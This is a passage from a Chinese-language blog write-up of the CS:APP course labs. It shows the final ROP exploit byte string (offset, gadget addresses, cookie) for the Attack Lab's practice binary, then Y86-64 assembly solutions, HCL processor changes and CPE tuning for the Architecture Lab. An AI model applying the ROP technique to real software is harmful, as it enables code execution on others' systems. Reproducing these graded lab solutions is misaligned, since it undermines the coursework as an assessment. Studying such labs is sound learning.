<span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span>	# string<br></code></pre></td></tr></table></figure>

<p>故偏移量为6个地址的长度72即<code>0x48</code>，随意填满缓冲区，得到输入：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">46</span> <span class="hljs-number">47</span><br><span class="hljs-attribute">32</span> <span class="hljs-number">31</span> <span class="hljs-number">48</span> <span class="hljs-number">49</span> <span class="hljs-number">4</span>a <span class="hljs-number">4</span>b <span class="hljs-number">4</span>c <span class="hljs-number">4</span>d<br><span class="hljs-attribute">00</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">4</span>e <span class="hljs-number">4</span>f <span class="hljs-number">50</span> <span class="hljs-number">51</span> <span class="hljs-number">52</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">53</span> <span class="hljs-number">54</span> <span class="hljs-number">55</span> <span class="hljs-number">56</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">57</span> <span class="hljs-number">58</span> <span class="hljs-number">59</span> <span class="hljs-number">5</span>a<br><span class="hljs-attribute">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">34</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span>	<br></code></pre></td></tr></table></figure>

<p><strong>Attack Lab结束。</strong></p>
<h2 id="4-Architecture-Lab-复用，丧心病狂"><a href="#4-Architecture-Lab-复用，丧心病狂" class="headerlink" title="4. Architecture Lab: 复用，丧心病狂"></a>4. Architecture Lab: 复用，丧心病狂</h2><p>准备工作：对gcc 10+的编译器打开编译选项<code>-fcommon</code>。</p>
<p>并对<code>ssim.c</code>, <code>psim.c</code>删除含有<code>matherr</code>的部分：</p>
<p><img src="/CSAPP3e_WP/image-20240130112206290-172450353894821.png" style="zoom:80%;" align="left"></p>





<h3 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h3><p>只需要按照<code>examples.c</code>的程序编写汇编代码即可，没有特别的难点，故下文直接给出解法。</p>
<h4 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    .pos   0<br>    irmovq stack,%rsp<br>    call   main<br>    halt<br><br># Sample linked list<br>    .align 8<br>ele1:<br>    .quad  0x00a<br>    .quad  ele2<br>ele2:<br>    .quad  0x0b0<br>    .quad  ele3<br>ele3:<br>    .quad  0xc00<br>    .quad  0<br><br>main:<br>    irmovq ele1,%rdi<br>    call   sum<br>    ret<br>sum:<br>    xorq   %rax,%rax<br>    jmp    test<br>loop:<br>    mrmovq (%rdi),%rsi<br>    addq   %rsi,%rax<br>    mrmovq $8(%rdi),%rdi<br>test:    <br>    andq   %rdi,%rdi<br>    jne    loop<br>    ret<br><br>#stack starts here and grows to lower address<br>    .pos   0x200<br>stack:<br><br></code></pre></td></tr></table></figure>

<h4 id="rsum"><a href="#rsum" class="headerlink" title="rsum"></a>rsum</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    .pos   0<br>    irmovq stack,%rsp<br>    call   main<br>    halt<br><br># Sample linked list<br>    .align 8<br>ele1:<br>    .quad  0x00a<br>    .quad  ele2<br>ele2:<br>    .quad  0x0b0<br>    .quad  ele3<br>ele3:<br>    .quad  0xc00<br>    .quad  0<br><br>main:<br>    irmovq ele1,%rdi<br>    call   rsum<br>    ret<br>rsum:<br>    pushq  %rsi<br>    xorq   %rax,%rax<br>    andq   %rdi,%rdi<br>    je     end<br>    mrmovq (%rdi),%rsi<br>    mrmovq $8(%rdi),%rdi<br>    call   rsum<br>    addq   %rsi,%rax<br>end:    <br>    popq   %rsi<br>    ret<br><br>#stack starts here and grows to lower address<br>    .pos   0x200<br>stack:<br><br></code></pre></td></tr></table></figure>

<h4 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    .pos   0<br>    irmovq stack,%rsp<br>    call   main<br>    halt<br><br># Sample blocks<br>	.align 8<br>src:<br>    .quad 0x00a<br>    .quad 0x0b0<br>    .quad 0xc00<br>dest:<br>    .quad 0x111<br>    .quad 0x222<br>    .quad 0x333<br><br>main:<br>    irmovq src,%rdi<br>    irmovq dest,%rsi<br>    irmovq $3,%rdx<br>    call   copy<br>    ret<br>copy:<br>    xorq   %rax,%rax<br>    irmovq $8,%r8<br>    irmovq $1,%r9<br>    andq   %rdx,%rdx<br>    jmp    test<br>loop:<br>    mrmovq (%rdi),%rcx<br>    rmmovq %rcx,(%rsi)<br>    addq   %r8,%rdi<br>    addq   %r8,%rsi<br>    xorq   %rcx,%rax<br>    subq   %r9,%rdx<br>test:<br>    jne    loop<br>    ret<br><br>#stack starts here and grows to lower address<br>    .pos   0x200<br>stack:<br><br></code></pre></td></tr></table></figure>

<h3 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h3><p>在<code>seq-full.hcl</code>中，为SEQ处理器添加<code>iaddq</code>指令，格式如下。</p>
<p><img src="/CSAPP3e_WP/image-20240130103617334-172450354200723.png" style="zoom:80%;" align="left"></p>

<p>完成本部分的要点：</p>
<p>·<code>iaddq</code>指令需要寄存器rB，需要regid byte并指定B source和E destination为rB，valB也是aluB输入</p>
<p>·<code>iaddq</code>指令需要立即数valC，是aluA输入</p>
<p>·<code>iaddq</code>指令需要更新条件码</p>
<p>本部分需要的改动如下，一共8处：</p>
<p><img src="/CSAPP3e_WP/image-20240130104635910-172450354535525.png" style="zoom: 50%;" align="left"></p>

<p><img src="/CSAPP3e_WP/image-20240130104730781-172450354929327.png" style="zoom: 60%;" align="left"></p>

<p><img src="/CSAPP3e_WP/image-20240130104906410-172450356093629.png" style="zoom: 55%;" align="left"></p>

<p><img src="/CSAPP3e_WP/image-20240130104938970-172450356436831.png" style="zoom:51%;" align="left"></p>

































































































<h3 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h3><p>先仿照Part B添加<code>iaddq</code>指令，对初始状态的PIPE处理器和<code>ncopy.ys</code>程序执行基准测试<code>benchmark.pl</code>，CPE为15.18。</p>
<h4 id="1-指令条数优化"><a href="#1-指令条数优化" class="headerlink" title="1.指令条数优化"></a>1.指令条数优化</h4><p>利用实现的<code>iaddq</code>指令减少指令数，同时利用减法的条件码直接判断<code>len</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># You can modify this portion<br>	# Loop header<br>    xorq %rax,%rax		# count = 0;<br>	andq %rdx,%rdx		# len &lt;= 0?<br>	jle Done			# if so, goto Done:<br>Loop:	<br>	mrmovq (%rdi), %rbp	# read val from src...<br>	rmmovq %rbp, (%rsi)	# ...and store it to dst<br>	andq %rbp, %rbp		# val &lt;= 0?<br>	jle Npos			# if so, goto Npos:<br>	iaddq $1, %rax		# count++<br>Npos:	<br>	iaddq $8, %rdi		# src++<br>	iaddq $8, %rsi		# dst++<br>	iaddq $-1, %rdx		# len--<br>	jg Loop				# if len &gt; 0, goto Loop:<br></code></pre></td></tr></table></figure>

<p>此操作大幅减少了CPE至11.70。</p>
<h4 id="2-循环展开"><a href="#2-循环展开" class="headerlink" title="2.循环展开"></a>2.循环展开</h4><p>%rax, %rdi, %rsi, %rdx, %rsp不能使用，可以使用剩下10个寄存器，并且由于1000字节的代码长度限制，循环展开不超过10路是比较可行的。</p>
<p>考虑循环展开n路，余下部分逐个循环读入，因此n较大时CPE会受到剩余数据的影响，在后续阶段处理这个问题。选取部分数值测试CPE如下：</p>
<table>
<thead>
<tr>
<th>n</th>
<th>1</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>10</th>
</tr>
</thead>
<tbody><tr>
<td>CPE</td>
<td>11.70</td>
<td>8.59</td>
<td>8.57</td>
<td>8.60</td>
<td>8.64</td>
<td>8.69</td>
<td>8.74</td>
</tr>
</tbody></table>
<p>此处取n&#x3D;6；同时发现去除第一条指令仍能通过正确性测试，修改代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># You can modify this portion<br>	# Loop header<br>	# init: count = 0;	<br>	iaddq $-6,%rdx		# len &lt;= 6?<br>	jle  Base			# if so, goto Base:<br>Loop:<br>	# read val from src...<br>	mrmovq 	  (%rdi), %rbp	<br>	mrmovq  $8(%rdi), %rbx<br>	mrmovq $16(%rdi), %rcx	<br>	mrmovq $24(%rdi), %r8	<br>	mrmovq $32(%rdi), %r9	<br>	mrmovq $40(%rdi), %r10				<br>val1:	<br>	rmmovq %rbp, (%rsi)		# ...and store it to dst<br>	andq   %rbp, %rbp		# val &lt;= 0?<br>	jle    val2				# if so, goto val2:<br>	iaddq  $1, %rax			# count++<br>val2: # omitted<br>val3: # omitted<br>val4: # omitted<br>val5: # omitted<br>val6:	<br>	rmmovq %r10, $40(%rsi)	<br>	andq   %r10, %r10		<br>	jle    Next				<br>	iaddq  $1, %rax			<br>Next:<br>	iaddq $48, %rdi			# src+=6<br>	iaddq $48, %rsi			# dst+=6<br>	iaddq $-6, %rdx			# len-=6<br>	jg  Loop				# if len &gt; 0, goto Loop:<br>Base:<br>	iaddq $6, %rdx			# len+=6<br>	je  Done				# if zero, goto Done:<br>BLoop:	<br>	mrmovq (%rdi), %rbx		# read val from src...<br>	andq %rbx, %rbx			# val &lt;= 0?<br>	rmmovq %rbx, (%rsi)		# ...and store it to dst<br>	jle BNpos				# if so, goto BNpos:<br>	iaddq $1, %rax			# count++<br>BNpos:	<br>	iaddq $8, %rdi			# src++<br>	iaddq $8, %rsi			# dst++<br>	iaddq $-1, %rdx			# len--<br>	jg BLoop				# if len &gt; 0, goto BLoop:<br></code></pre></td></tr></table></figure>

<p>经过第2步优化的CPE为8.50。</p>
<h4 id="3-条件跳转优化"><a href="#3-条件跳转优化" class="headerlink" title="3.条件跳转优化"></a>3.条件跳转优化</h4><p>使用一个条件可以执行<code>jl</code>,<code>je</code>,<code>jg</code>三种跳转，把不多于6个数的查找(Base分支)转化为二叉查找树，根为3，分支点为3,1,5，其中评判权重大的分支更靠前（优先级排序为1&gt;2&gt;0, 4&gt;5&gt;6），改写Base分支如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Base:<br>	iaddq $6, %rdx			# len+=6<br>	je  Done				# if zero, goto Done:<br>	<br>	iaddq $-3, %rdx<br>	jl  BR1<br>	jg	BR5<br>	jmp	Incl3<br>BR1:<br>    iaddq $2, %rdx<br>    je copy1<br>    jg copy2<br>    jmp Done<br>BR5:<br>    iaddq $-2, %rdx<br>	jl copy4<br>    je copy5<br>    jmp copy6<br><br>copy6:<br>    mrmovq $40(%rdi), %r10 		# read val from src...<br>    andq %r10, %r10 			# val &lt;= 0?<br>    rmmovq %r10, $40(%rsi) 		# ...and store it to dst<br>    jle copy5<br>    iaddq $1, %rax <br>copy5: # omitted<br>copy4: # omitted<br>copy3: # omitted<br>copy2: # omitted<br>copy1: # omitted<br></code></pre></td></tr></table></figure>

<p>CPE为8.04。</p>
<p>如果调整主循环的边界条件，将len为6的条件置入主循环中则效率更高：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># You can modify this portion<br>	# Loop header<br>	# init: count = 0;	<br>	iaddq $-6,%rdx		# len &lt; 6?<br>	jl  Base			# if so, goto Base:<br>Loop: # unchanged<br>Next:<br>	iaddq $48, %rdi			# src+=6<br>	iaddq $48, %rsi			# dst+=6<br>	iaddq $-6, %rdx			# len-=6<br>	jge  Loop				# if len &gt;= 0, goto Loop:<br>Base:<br>	iaddq $6, %rdx			# len+=6<br>	je  Done				# if zero, goto Done:<br># omitted<br>BR5:<br>    iaddq $-2, %rdx<br>	jl copy4<br>    jmp copy5<br>copy6: # unused<br>copy5: # unchanged<br></code></pre></td></tr></table></figure>

<p>此时的CPE仍有提升，为7.92。</p>
<p>为了将查找树最后一层填满，可以利用copy6并将循环展开至7路，CPE小幅减少，此时程序大致结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># You can modify this portion<br>	# Loop header<br>	# init: count = 0;	<br>	iaddq $-7,%rdx		# len &lt; 7?<br>	jl   Base			# if so, goto Base:<br>Loop:<br>	# read val from src...<br>	mrmovq 	  (%rdi), %rbp	<br>	mrmovq  $8(%rdi), %rbx<br>	mrmovq $16(%rdi), %rcx	<br>	mrmovq $24(%rdi), %r8	<br>	mrmovq $32(%rdi), %r9	<br>	mrmovq $40(%rdi), %r10		<br>	mrmovq $48(%rdi), %r11			<br>val1: # unchanged<br>val2: # unchanged		<br>val3: # unchanged	<br>val4: # unchanged	<br>val5: # unchanged			<br>val6: # omitted			<br>val7: <br>	andq   %r11, %r11<br>	rmmovq %r11, $48(%rsi)	<br>	jle    Next				<br>	iaddq  $1, %rax		<br>Next:<br>	iaddq $56, %rdi			# src+=7<br>	iaddq $56, %rsi			# dst+=7<br>	iaddq $-7, %rdx			# len-=7<br>	jge  Loop				# if len &gt;= 0, goto Loop:<br>Base:<br>	iaddq $7, %rdx			# len+=7<br>	je  Done				# if zero, goto Done:<br>BR3: # unchanged<br>BR1: # unchanged<br>BR5:<br>	iaddq $-2, %rdx<br>	jl copy4<br>	je copy5<br>copy6:<br>    mrmovq $40(%rdi), %r10 	<br>	andq %r10, %r10	 		<br>    rmmovq %r10, $40(%rsi) 	<br>    jle copy5<br>    iaddq $1, %rax <br>copy5: # unchanged<br>copy4: # unchanged<br>copy3: # unchanged<br>copy2: # unchanged<br>copy1: # unchanged<br></code></pre></td></tr></table></figure>

<p>第3步优化结束，CPE&#x3D;7.88。</p>
<h4 id="4-数据旁路"><a href="#4-数据旁路" class="headerlink" title="4.数据旁路"></a>4.数据旁路</h4><p><code>mrmovq</code>和<code>rmmovq</code>之间的<code>andq</code>指令判断当前取出的数据，需要为valA添加数据旁路，对<code>pipe-full.hcl</code>作以下改动：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 替换以下表达式：<br>   word e_valA = E_valA;    # Pass valA through stage <br># 改为：<br>   word e_valA = [<br>		E_icode in &#123; IRMMOVQ, IPUSHQ &#125; &amp;&amp; E_srcA == M_dstM :m_valM;	   # valA bypass<br>		1												   :E_valA;    # Pass valA through stage<br>   ];<br></code></pre></td></tr></table></figure>

<p>改动完成后可以删除流水线中相应的暂停和空泡，修改方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 替换以下表达式：<br>    E_dstM in &#123; d_srcA, d_srcB &#125;<br># 改为：<br>    ( E_dstM ==  d_srcB || E_dstM == d_srcA &amp;&amp;  !D_icode in &#123; IRMMOVQ, IPUSHQ &#125; )<br></code></pre></td></tr></table></figure>

<p>添加数据旁路后，可以将全部<code>rmmovq</code>指令提前，程序中也减少了顺序限制，CPE减至7.69。</p>
<p>重新考虑循环展开，经测试，如果循环展开成9路，并且查找树改为下图所示，则CPE优化到7.68：</p>
<p><img src="/CSAPP3e_WP/image-20240131144006809-172450356875933.png" style="zoom:67%;" align="left"></p>















<p>此时发现查找树中已经包含了0，似乎取消在Base情况中特判0可以提高效率，修改此部分代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Base:<br>    iaddq $6,%rdx			# start with root=3<br>    jl BR1<br>    jg BR5<br>    jmp copy3<br>BR1:<br>    iaddq $2,%rdx<br>    je copy1<br>    jg copy2<br>    ret         <br>BR5:<br>    iaddq $-2,%rdx<br>    jl copy4<br>    je copy5<br>BR7:<br>    iaddq $-2,%rdx<br>    jl copy6<br>	je copy7<br>copy8:<br>    mrmovq $56(%rdi), %r12 	<br>    rmmovq %r12, $56(%rsi) 	<br>	andq %r12, %r12	 		<br>    jle copy7<br>    iaddq $1, %rax 	<br># omitted<br></code></pre></td></tr></table></figure>

<p>此时可以将CPE做到7.44，轻松满分——如果不用trick呢？</p>
<p>虽然此处%rax的初值为零，可以去除第一条指令，但在一般情形下，%rax的初值可能是不确定的，恢复在第2步中被删除的<code>xorq %rax, %rax</code>指令，重新运行测试，CPE&#x3D;7.51。</p>
<h4 id="5-参数修正与最终优化结果"><a href="#5-参数修正与最终优化结果" class="headerlink" title="5.参数修正与最终优化结果"></a>5.参数修正与最终优化结果</h4><p>6所在节点太深，可能需要调整查找树的结构；1,2,3对CPE影响大，故左子树和根不更改。尝试修改如下：</p>
<p><img src="/CSAPP3e_WP/image-20240131165552508-172450357635835.png" style="zoom: 67%;" align="left"></p>















<p>修改Base的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Base:<br>    iaddq $6,%rdx			# start with root=3<br>    jl BR1<br>    jg BR6<br>    jmp copy3<br>BR1:<br>    iaddq $2,%rdx<br>    je copy1<br>    jg copy2<br>    ret <br>BR5:<br>	iaddq $1,%rdx<br>    jl copy4<br>    je copy5<br>BR6:<br>    iaddq $-3,%rdx<br>    jl BR5<br>    je copy6<br>BR7:<br>    iaddq $-2,%rdx<br>    jl copy7<br>copy8:<br>    mrmovq $56(%rdi), %r12 	<br>    rmmovq %r12, $56(%rsi) 	<br>	andq %r12, %r12	 		<br>    jle copy7<br>    iaddq $1, %rax 	<br># omitted<br></code></pre></td></tr></table></figure>

<p>修改后在基准测试中CPE&#x3D;7.49。</p>
<h2 id="5a-Cache-Lab-缓存宝贵，不能浪费"><a href="#5a-Cache-Lab-缓存宝贵，不能浪费" class="headerlink" title="5a. Cache Lab:  缓存宝贵，不能浪费"></a>5a. Cache Lab:  缓存宝贵，不能浪费</h2><h3 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h3><p>完成cache模拟器，输入Valgrind memory trace文件，输出hit, miss, eviction的总数。因此缓存模拟器只要精确到缓存行的行为即可，置换算法使用LRU。</p>
<p>定义全局变量——缓存参数、计数器、LRU算法计时器、缓存行结构体：</p>
